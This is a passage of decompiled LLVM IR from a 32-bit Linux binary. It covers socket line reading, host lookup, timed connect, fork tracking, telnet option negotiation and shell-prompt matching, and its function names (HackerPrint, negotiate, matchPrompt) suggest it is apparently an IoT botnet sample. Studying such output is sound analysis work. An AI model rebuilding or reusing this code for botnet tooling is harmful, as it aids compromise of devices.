  br i1 %exitcond, label %dec_label_pc_80491c5.dec_label_pc_80491cd_crit_edge, label %dec_label_pc_804918a

dec_label_pc_80491c5.dec_label_pc_80491cd_crit_edge: ; preds = %dec_label_pc_804918a
  %v2_80491d0.pre = load i32, i32* %stack_var_-8, align 4
  %v2_80491d1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80491cd

dec_label_pc_80491cd:                             ; preds = %dec_label_pc_80491c5.dec_label_pc_80491cd_crit_edge, %entry
  %v2_80491d1 = phi i32 [ %v2_80491d1.pre, %dec_label_pc_80491c5.dec_label_pc_80491cd_crit_edge ], [ %v0_8049173, %entry ]
  %v2_80491d0 = phi i32 [ %v2_80491d0.pre, %dec_label_pc_80491c5.dec_label_pc_80491cd_crit_edge ], [ %v0_8049176, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_80491c5.dec_label_pc_80491cd_crit_edge ], [ 0, %entry ]
  store i32 %v2_80491d0, i32* @ebx, align 4
  store i32 %v2_80491d1, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_80491c1, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804918a, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80491d6 = load i32, i32* @edi, align 4
  store i32 %v0_80491d6, i32* %stack_var_-8, align 4
  %v6_80491f2 = call i32 @__GI_memset(i8* %arg2, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8049215 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049215, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804921c = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8049229 = udiv i32 %arg1, 32
  %v1_804922f = urem i32 %arg1, 32
  %v0_8049232 = load i32, i32* @ebp, align 4
  %v2_8049232 = mul nuw nsw i32 %v2_8049229, 4
  %v3_8049232 = add nsw i32 %v2_8049232, -164
  %v4_8049232 = add i32 %v3_8049232, %v0_8049232
  %v5_8049232 = inttoptr i32 %v4_8049232 to i32*
  %v6_8049232 = load i32, i32* %v5_8049232, align 4
  %v9_8049232 = shl i32 1, %v1_804922f
  %v12_8049232 = or i32 %v6_8049232, %v9_8049232
  store i32 %v12_8049232, i32* %v5_8049232, align 4
  %v1_804923d = add i32 %arg1, 1
  %v2_8049240 = ptrtoint i32* %stack_var_-176 to i32
  %v7_8049269 = call i32 @__libc_select(i32 %v1_804923d, i32 %v2_8049215, i32 0, i32 %v2_8049215, i32 %v2_8049240)
  %tmp33 = icmp slt i32 %v7_8049269, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_8049323, label %dec_label_pc_8049319.preheader

dec_label_pc_8049319.preheader:                   ; preds = %entry
  %v7_804931d45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804931d45, label %dec_label_pc_8049323, label %dec_label_pc_8049280

dec_label_pc_8049280:                             ; preds = %dec_label_pc_8049319.preheader, %dec_label_pc_8049315
  %stack_var_-36.046 = phi i32 [ %v4_8049315, %dec_label_pc_8049315 ], [ %tmp11, %dec_label_pc_8049319.preheader ]
  %v0_8049280 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_8049280 = ptrtoint i8* %v0_8049280 to i32
  %v4_8049290 = call i32 @HackerPrint(i32 %v1_8049280, i32 ptrtoint ([5 x i8]* @global_var_80689d7.31 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8049215, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80492ba = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_80492d0 = load i32, i32* @ebp, align 4
  %v4_80492d0 = add i32 %v3_8049232, %v0_80492d0
  %v5_80492d0 = inttoptr i32 %v4_80492d0 to i32*
  %v6_80492d0 = load i32, i32* %v5_80492d0, align 4
  %v12_80492d0 = or i32 %v6_80492d0, %v9_8049232
  store i32 %v12_80492d0, i32* %v5_80492d0, align 4
  %v7_8049307 = call i32 @__libc_select(i32 %v1_804923d, i32 %v2_8049215, i32 0, i32 %v2_8049215, i32 %v2_8049240)
  %tmp35 = icmp slt i32 %v7_8049307, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8049323, label %dec_label_pc_8049315

dec_label_pc_8049315:                             ; preds = %dec_label_pc_8049280
  %v4_8049315 = add nsw i32 %stack_var_-36.046, 1
  %v7_804931d = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_804931d, label %dec_label_pc_8049323, label %dec_label_pc_8049280

dec_label_pc_8049323:                             ; preds = %dec_label_pc_8049319.preheader, %dec_label_pc_8049280, %dec_label_pc_8049315, %entry
  %v2_8049347 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_804938f

dec_label_pc_8049332:                             ; preds = %dec_label_pc_804938f
  %v0_8049332 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_8049332 = ptrtoint i8* %v0_8049332 to i32
  %v6_8049354 = call i32 @__libc_recv(i32 %v1_8049332, i32 %v2_8049347, i32 1, i32 0)
  %v9_8049359 = icmp eq i32 %v6_8049354, 1
  br i1 %v9_8049359, label %dec_label_pc_8049370, label %dec_label_pc_804935e

dec_label_pc_804935e:                             ; preds = %dec_label_pc_8049332
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80493c1

dec_label_pc_8049370:                             ; preds = %dec_label_pc_8049332
  %v3_8049370 = load i8, i8* %stack_var_-177, align 1
  %v4_8049377 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049370, i8* %stack_var_-32.0, align 1
  %v5_804937c = add i32 %v4_8049377, 1
  %v23_804937c = inttoptr i32 %v5_804937c to i8*
  %v3_8049380 = load i8, i8* %stack_var_-177, align 1
  %v10_8049387 = icmp eq i8 %v3_8049380, 10
  br i1 %v10_8049387, label %dec_label_pc_804939e, label %dec_label_pc_804938b

dec_label_pc_804938b:                             ; preds = %dec_label_pc_8049370
  %v4_804938b = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804938f

dec_label_pc_804938f:                             ; preds = %dec_label_pc_8049323, %dec_label_pc_804938b
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_8049323 ], [ %v23_804937c, %dec_label_pc_804938b ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8049323 ], [ %v4_804938b, %dec_label_pc_804938b ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_8049323 ], [ %v4_804938f, %dec_label_pc_804938b ]
  %v4_804938f = add i32 %stack_var_12.0, -1
  %v9_804938f = sub i32 0, %stack_var_12.0
  %v10_804938f = and i32 %stack_var_12.0, %v9_804938f
  %v11_804938f = icmp slt i32 %v10_804938f, 0
  %v12_804938f = icmp eq i32 %v4_804938f, 0
  %v13_804938f = icmp slt i32 %v4_804938f, 0
  %v3_8049393 = icmp eq i1 %v13_804938f, %v11_804938f
  %v4_8049393 = icmp eq i1 %v12_804938f, false
  %v5_8049393 = and i1 %v4_8049393, %v3_8049393
  %v4_804939a = icmp eq i1 %v5_8049393, false
  %v1_804939c = icmp eq i1 %v4_804939a, false
  br i1 %v1_804939c, label %dec_label_pc_8049332, label %dec_label_pc_804939e

dec_label_pc_804939e:                             ; preds = %dec_label_pc_8049370, %dec_label_pc_804938f
  %stack_var_-32.1 = phi i8* [ %v23_804937c, %dec_label_pc_8049370 ], [ %stack_var_-32.0, %dec_label_pc_804938f ]
  %v4_804939e = ptrtoint i8* %stack_var_-32.1 to i32
  store i8 0, i8* %stack_var_-32.1, align 1
  %v4_80493b3 = call i32 @zprintf(i32 ptrtoint ([10 x i8]* @global_var_80689dc.32 to i32), i32 %v4_804939e)
  br label %dec_label_pc_80493c1

dec_label_pc_80493c1:                             ; preds = %dec_label_pc_804935e, %dec_label_pc_804939e
  %storemerge = phi i32 [ -1, %dec_label_pc_804935e ], [ %stack_var_-28.0, %dec_label_pc_804939e ]
  %v2_80493cd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80493cd, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v4_804938f, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v23_804937c, { 1, 0 }
  uselistorder i32 %v2_8049215, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @zprintf, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80493c1, { 1, 0 }
  uselistorder label %dec_label_pc_804939e, { 1, 0 }
  uselistorder label %dec_label_pc_804938f, { 1, 0 }
  uselistorder label %dec_label_pc_8049323, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049280, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_80493dc = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_80493e4 = icmp eq i32 %v2_80493dc, 0
  %v1_80493e8 = icmp eq i1 %v4_80493e4, false
  br i1 %v1_80493e8, label %dec_label_pc_80493ff, label %dec_label_pc_80493ea

dec_label_pc_80493ea:                             ; preds = %entry
  %v3_80493f1 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80689e6.33, i32 0, i32 0))
  br label %dec_label_pc_8049452

dec_label_pc_80493ff:                             ; preds = %entry
  %v1_8049402 = add i32 %v2_80493dc, 16
  %v2_8049402 = inttoptr i32 %v1_8049402 to i32*
  %v3_8049402 = load i32, i32* %v2_8049402, align 4
  %v1_8049418 = inttoptr i32 %v3_8049402 to i32*
  %v2_8049418 = load i32, i32* %v1_8049418, align 4
  %v1_804941a = icmp eq i32 %v2_8049418, 0
  br i1 %v1_804941a, label %dec_label_pc_8049452, label %dec_label_pc_804941e

dec_label_pc_804941e:                             ; preds = %dec_label_pc_80493ff
  %v2_8049427 = load i32, i32* %v1_8049418, align 4
  %v1_8049429 = inttoptr i32 %v2_8049427 to i32*
  %v2_8049429 = load i32, i32* %v1_8049429, align 4
  %v2_804942e = call i32 @__GI_inet_ntoa(i32 %v2_8049429)
  store i32 %arg2, i32* @eax, align 4
  %v4_804943a = inttoptr i32 %arg2 to i8*
  %v4_804943d = call i32 @strcpy(i8* %v4_804943a, i32 %v2_804942e)
  br label %dec_label_pc_8049452

dec_label_pc_8049452:                             ; preds = %dec_label_pc_80493ff, %dec_label_pc_804941e, %dec_label_pc_80493ea
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_804941e ], [ 1, %dec_label_pc_80493ea ], [ 1, %dec_label_pc_80493ff ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049452, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804945a = load i32, i32* @edi, align 4
  store i32 %v0_804945a, i32* %stack_var_-8, align 4
  %v3_8049477 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804947f = or i32 %v3_8049477, 2048
  %v3_804949b = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804947f)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80494af = trunc i32 %arg3 to i16
  %v2_80494af = call i32 @__GI_htons(i16 %v1_80494af)
  store i32 %arg2, i32* @edx, align 4
  %v3_80494c8 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_80494cd = icmp eq i32 %v3_80494c8, 0
  br i1 %v1_80494cd, label %dec_label_pc_80494e0, label %dec_label_pc_804965d

dec_label_pc_80494e0:                             ; preds = %entry
  %v2_80494bb = ptrtoint i32* %stack_var_-40 to i32
  %v3_80494f9 = bitcast i32* %stack_var_-32 to i8*
  %v4_80494f9 = call i32 @__GI_memset(i8* %v3_80494f9, i32 0, i32 8)
  %v3_8049513 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80494bb, i32 16)
  %v5_804951b = icmp slt i32 %v3_8049513, 0
  %v1_804951f = icmp eq i1 %v5_804951b, false
  br i1 %v1_804951f, label %dec_label_pc_8049614, label %dec_label_pc_8049525

dec_label_pc_8049525:                             ; preds = %dec_label_pc_80494e0
  %v1_8049525 = call i32 @__GI___errno_location(i32 %v3_8049513)
  %v1_804952a = inttoptr i32 %v1_8049525 to i32*
  %v2_804952a = load i32, i32* %v1_804952a, align 4
  %v9_804952c = icmp eq i32 %v2_804952a, 115
  %v1_804952f = icmp eq i1 %v9_804952c, false
  br i1 %v1_804952f, label %dec_label_pc_804965d, label %dec_label_pc_8049535

dec_label_pc_8049535:                             ; preds = %dec_label_pc_8049525
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049552 = ptrtoint i32* %stack_var_-168 to i32
  %tmp26 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049552, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049559 = call i8* @_memset(i8* %tmp26, i32 0, i32 32)
  %v2_8049566 = udiv i32 %arg1, 32
  %v1_804956c = urem i32 %arg1, 32
  %v0_804956f = load i32, i32* @ebp, align 4
  %v2_804956f = mul nuw nsw i32 %v2_8049566, 4
  %v3_804956f = add nsw i32 %v2_804956f, -164
  %v4_804956f = add i32 %v3_804956f, %v0_804956f
  %v5_804956f = inttoptr i32 %v4_804956f to i32*
  %v6_804956f = load i32, i32* %v5_804956f, align 4
  %v9_804956f = shl i32 1, %v1_804956c
  %v12_804956f = or i32 %v6_804956f, %v9_804956f
  store i32 %v12_804956f, i32* %v5_804956f, align 4
  %v1_804957a = add i32 %arg1, 1
  %v2_804957d = ptrtoint i32* %stack_var_-176 to i32
  %v5_80495a4 = call i32 @__libc_select(i32 %v1_804957a, i32 0, i32 %v2_8049552, i32 0, i32 %v2_804957d)
  %tmp27 = icmp slt i32 %v5_80495a4, 1
  br i1 %tmp27, label %dec_label_pc_804965d, label %dec_label_pc_80495ad

dec_label_pc_80495ad:                             ; preds = %dec_label_pc_8049535
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80495b7 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80495c1 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80495e1 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80495c1, i32 %v2_80495b7)
  %v3_80495e6 = load i32, i32* %stack_var_-184, align 4
  %v1_80495ec = icmp eq i32 %v3_80495e6, 0
  br i1 %v1_80495ec, label %dec_label_pc_8049614, label %dec_label_pc_804965d

dec_label_pc_8049614:                             ; preds = %dec_label_pc_80495ad, %dec_label_pc_80494e0
  %v3_804962a = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049632 = and i32 %v3_804962a, -2049
  %v3_804964e = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049632)
  br label %dec_label_pc_804965d

dec_label_pc_804965d:                             ; preds = %dec_label_pc_8049525, %dec_label_pc_8049535, %dec_label_pc_80495ad, %entry, %dec_label_pc_8049614
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8049614 ], [ 0, %entry ], [ 0, %dec_label_pc_80495ad ], [ 0, %dec_label_pc_8049535 ], [ 0, %dec_label_pc_8049525 ]
  %v2_8049669 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049669, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804965d, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804966f = load i32, i32* @ebx, align 4
  store i32 %v0_804966f, i32* %stack_var_-8, align 4
  %v1_8049673 = call i32 @__libc_fork(i32 %v0_804966f)
  %v4_804967b = icmp eq i32 %v1_8049673, 0
  %v1_804967f = icmp eq i1 %v4_804967b, false
  br i1 %v1_804967f, label %dec_label_pc_804968c, label %dec_label_pc_8049681

dec_label_pc_8049681:                             ; preds = %entry
  br label %dec_label_pc_804976e

dec_label_pc_804968c:                             ; preds = %entry
  %v0_804968c = load i32, i32* @global_var_8071b48.34, align 8
  %v0_8049691 = load i32, i32* @global_var_8071b4c.35, align 4
  %v1_8049697 = add i32 %v0_804968c, 1
  %v5_8049697 = icmp eq i32 %v0_804968c, -1
  %v2_804969a = zext i1 %v5_8049697 to i32
  %v3_804969a = add i32 %v2_804969a, %v0_8049691
  store i32 %v1_8049697, i32* @global_var_8071b48.34, align 8
  store i32 %v3_804969a, i32* @global_var_8071b4c.35, align 4
  %tmp = mul i32 %v0_804968c, 4
  %v2_80496bd = add i32 %tmp, 8
  %v1_80496c3 = call i32 @malloc(i32 %v2_80496bd)
  br label %dec_label_pc_80496f7

dec_label_pc_80496d4:                             ; preds = %dec_label_pc_80496f7, %dec_label_pc_8049728
  %v2_80496d7 = mul i32 %storemerge1, 4
  %v5_80496dc = add i32 %v2_80496d7, %v1_80496c3
  %v0_80496e7 = load i32, i32* @global_var_8078874.36, align 4
  %v2_80496ec = add i32 %v0_80496e7, %v2_80496d7
  %v1_80496ef = inttoptr i32 %v2_80496ec to i32*
  %v2_80496ef = load i32, i32* %v1_80496ef, align 4
  %v2_80496f1 = inttoptr i32 %v5_80496dc to i32*
  store i32 %v2_80496ef, i32* %v2_80496f1, align 4
  %v4_80496f3 = add i32 %storemerge1, 1
  br label %dec_label_pc_80496f7

dec_label_pc_80496f7:                             ; preds = %dec_label_pc_804968c, %dec_label_pc_80496d4
  %storemerge1 = phi i32 [ %v4_80496f3, %dec_label_pc_80496d4 ], [ 0, %dec_label_pc_804968c ]
  %v0_8049705 = load i32, i32* @global_var_8071b48.34, align 8
  %v0_804970a = load i32, i32* @global_var_8071b4c.35, align 4
  %v4_8049714 = icmp ne i32 %v0_8049705, 0
  %v2_8049717 = zext i1 %v4_8049714 to i32
  %v3_8049717 = add i32 %v0_804970a, -1
  %v4_8049717 = add i32 %v3_8049717, %v2_8049717
  store i32 %v4_8049717, i32* @ebx, align 4
  %v10_8049723 = icmp eq i32 %v4_8049717, 0
  br i1 %v10_8049723, label %dec_label_pc_8049728, label %dec_label_pc_80496d4

dec_label_pc_8049728:                             ; preds = %dec_label_pc_80496f7
  %v1_8049714 = add i32 %v0_8049705, -1
  %v10_8049733 = icmp ult i32 %storemerge1, %v1_8049714
  br i1 %v10_8049733, label %dec_label_pc_80496d4, label %dec_label_pc_8049738

dec_label_pc_8049738:                             ; preds = %dec_label_pc_8049728
  %v2_8049743 = mul i32 %v0_8049705, 4
  %v1_8049746 = add i32 %v2_8049743, -4
  %v5_804974b = add i32 %v1_8049746, %v1_80496c3
  store i32 %v5_804974b, i32* @edx, align 4
  %v2_8049751 = inttoptr i32 %v5_804974b to i32*
  store i32 %v1_8049673, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @global_var_8078874.36, align 4
  %v1_804975b = call i32 @free(i32 %v0_8049753)
  store i32 %v1_80496c3, i32* @global_var_8078874.36, align 4
  store i32 %v1_8049673, i32* @ecx, align 4
  br label %dec_label_pc_804976e

dec_label_pc_804976e:                             ; preds = %dec_label_pc_8049681, %dec_label_pc_8049738
  %v2_8049774 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049774, i32* @ebx, align 4
  ret i32 %v1_8049673

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80496d7, { 1, 0 }
  uselistorder i32 %v1_80496c3, { 2, 0, 1 }
  uselistorder i32 %v0_804968c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804976e, { 1, 0 }
  uselistorder label %dec_label_pc_80496f7, { 1, 0 }
  uselistorder label %dec_label_pc_80496d4, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8049777 = load i32, i32* @ebp, align 4
  store i32 %v0_8049777, i32* %stack_var_-4, align 4
  %v1_8049780 = add i32 %arg2, 1
  %v1_8049783 = inttoptr i32 %v1_8049780 to i8*
  %v2_8049783 = load i8, i8* %v1_8049783, align 1
  %v9_804978c = icmp ult i8 %v2_8049783, -5
  br i1 %v9_804978c, label %dec_label_pc_80498a1, label %dec_label_pc_8049799

dec_label_pc_8049799:                             ; preds = %entry
  %v7_80497a0 = icmp eq i8 %v2_8049783, -1
  br i1 %v7_80497a0, label %dec_label_pc_80497a2, label %dec_label_pc_80497bc

dec_label_pc_80497a2:                             ; preds = %dec_label_pc_8049799
  br label %dec_label_pc_80498a1

dec_label_pc_80497bc:                             ; preds = %dec_label_pc_8049799
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80497d0 = ptrtoint i8* %stack_var_-5 to i32
  %v4_80497dd = call i32 @__libc_send(i32 %arg1, i32 %v2_80497d0, i32 1, i32 16384)
  %v2_80497e8 = load i8, i8* %v1_8049783, align 1
  %v11_80497eb = icmp eq i8 %v2_80497e8, -4
  %v1_80497ed = icmp eq i1 %v11_80497eb, false
  br i1 %v1_80497ed, label %dec_label_pc_80497f5, label %dec_label_pc_80497ef

dec_label_pc_80497ef:                             ; preds = %dec_label_pc_80497bc
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049853

dec_label_pc_80497f5:                             ; preds = %dec_label_pc_80497bc
  %v2_80497fb = load i8, i8* %v1_8049783, align 1
  %v11_80497fe = icmp eq i8 %v2_80497fb, -2
  %v1_8049800 = icmp eq i1 %v11_80497fe, false
  br i1 %v1_8049800, label %dec_label_pc_8049808, label %dec_label_pc_8049802

dec_label_pc_8049802:                             ; preds = %dec_label_pc_80497f5
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049853

dec_label_pc_8049808:                             ; preds = %dec_label_pc_80497f5
  %v2_804980e = load i8, i8* %v1_8049783, align 1
  %v10_8049811 = icmp eq i8 %v2_804980e, 3
  %v1_8049813 = icmp eq i1 %v10_8049811, false
  %v11_804983e = icmp eq i8 %v2_804980e, -3
  %v1_8049840 = icmp eq i1 %v11_804983e, false
  br i1 %v1_8049813, label %dec_label_pc_8049835, label %dec_label_pc_8049815

dec_label_pc_8049815:                             ; preds = %dec_label_pc_8049808
  %. = select i1 %v1_8049840, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049853

dec_label_pc_8049835:                             ; preds = %dec_label_pc_8049808
  %.3 = select i1 %v1_8049840, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049853

dec_label_pc_8049853:                             ; preds = %dec_label_pc_8049815, %dec_label_pc_8049802, %dec_label_pc_80497ef, %dec_label_pc_8049835
  %v4_8049870 = call i32 @__libc_send(i32 %arg1, i32 %v2_80497d0, i32 1, i32 16384)
  %v1_8049878 = add i32 %arg2, 2
  %v4_8049895 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049878, i32 1, i32 16384)
  %v2_80498a4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80498a1

dec_label_pc_80498a1:                             ; preds = %dec_label_pc_80497a2, %dec_label_pc_8049853, %entry
  %v2_80498a4 = phi i32 [ %v0_8049777, %dec_label_pc_80497a2 ], [ %v2_80498a4.pre, %dec_label_pc_8049853 ], [ %v0_8049777, %entry ]
  store i32 %v2_80498a4, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80498a1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049853, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80498a9 = load i32, i32* @ebx, align 4
  store i32 %v0_80498a9, i32* %stack_var_-8, align 4
  %v4_80498b4 = ptrtoint i8* %arg1 to i32
  %v3_80498ba = call i32 @strlen(i8* %arg1)
  %v6_80498e6 = add i32 %v3_80498ba, %v4_80498b4
  br label %dec_label_pc_804996f

dec_label_pc_80498d5:                             ; preds = %dec_label_pc_8049929, %dec_label_pc_8049911, %dec_label_pc_80498f9, %dec_label_pc_80498e1
  %v4_80498d5 = add nsw i32 %stack_var_-12.030, 1
  %v7_80498df = icmp sgt i32 %v3_80498ba, %v4_80498d5
  br i1 %v7_80498df, label %dec_label_pc_80498e1, label %dec_label_pc_80498d9.dec_label_pc_8049941_crit_edge

dec_label_pc_80498d9.dec_label_pc_8049941_crit_edge: ; preds = %dec_label_pc_80498d5, %dec_label_pc_80498d9.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_80498d9.preheader ], [ %v4_80498d5, %dec_label_pc_80498d5 ]
  %.pre = sub i32 %v6_80498e6, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049941

dec_label_pc_80498e1:                             ; preds = %dec_label_pc_80498d9.preheader, %dec_label_pc_80498d5
  %stack_var_-12.030 = phi i32 [ %v4_80498d5, %dec_label_pc_80498d5 ], [ %stack_var_-12.1, %dec_label_pc_80498d9.preheader ]
  %v2_80498ee = sub i32 %v6_80498e6, %stack_var_-12.030
  %v1_80498f2 = inttoptr i32 %v2_80498ee to i8*
  %v2_80498f2 = load i8, i8* %v1_80498f2, align 1
  %v4_80498f5 = icmp eq i8 %v2_80498f2, 0
  br i1 %v4_80498f5, label %dec_label_pc_80498d5, label %dec_label_pc_80498f9

dec_label_pc_80498f9:                             ; preds = %dec_label_pc_80498e1
  %v2_804990a = load i8, i8* %v1_80498f2, align 1
  %v7_804990d = icmp eq i8 %v2_804990a, 32
  br i1 %v7_804990d, label %dec_label_pc_80498d5, label %dec_label_pc_8049911

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498f9
  %v2_8049922 = load i8, i8* %v1_80498f2, align 1
  %v10_8049925 = icmp eq i8 %v2_8049922, 13
  br i1 %v10_8049925, label %dec_label_pc_80498d5, label %dec_label_pc_8049929

dec_label_pc_8049929:                             ; preds = %dec_label_pc_8049911
  %v2_804993a = load i8, i8* %v1_80498f2, align 1
  %v10_804993d = icmp eq i8 %v2_804993a, 10
  br i1 %v10_804993d, label %dec_label_pc_80498d5, label %dec_label_pc_8049941

dec_label_pc_8049941:                             ; preds = %dec_label_pc_8049929, %dec_label_pc_80498d9.dec_label_pc_8049941_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_80498d9.dec_label_pc_8049941_crit_edge ], [ %stack_var_-12.030, %dec_label_pc_8049929 ]
  %v1_8049952.pre-phi = phi i8* [ %.pre9, %dec_label_pc_80498d9.dec_label_pc_8049941_crit_edge ], [ %v1_80498f2, %dec_label_pc_8049929 ]
  %v2_8049952 = load i8, i8* %v1_8049952.pre-phi, align 1
  %v6_8049958 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_80689f4.37 to i32)
  %v1_804995b = inttoptr i32 %v6_8049958 to i8*
  %v2_804995b = load i8, i8* %v1_804995b, align 1
  %v15_804995e = icmp eq i8 %v2_8049952, %v2_804995b
  %v1_8049960 = icmp eq i1 %v15_804995e, false
  br i1 %v1_8049960, label %dec_label_pc_804996b, label %dec_label_pc_804998c

dec_label_pc_804996b:                             ; preds = %dec_label_pc_8049941
  %v4_804996b = add i32 %storemerge2, 1
  br label %dec_label_pc_804996f

dec_label_pc_804996f:                             ; preds = %entry, %dec_label_pc_804996b
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.021, %dec_label_pc_804996b ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_804996b, %dec_label_pc_804996b ]
  %v3_8049978 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80689f4.37, i32 0, i32 0))
  %v7_804997d = icmp ult i32 %storemerge2, %v3_8049978
  br i1 %v7_804997d, label %dec_label_pc_80498d9.preheader, label %dec_label_pc_804998c

dec_label_pc_80498d9.preheader:                   ; preds = %dec_label_pc_804996f
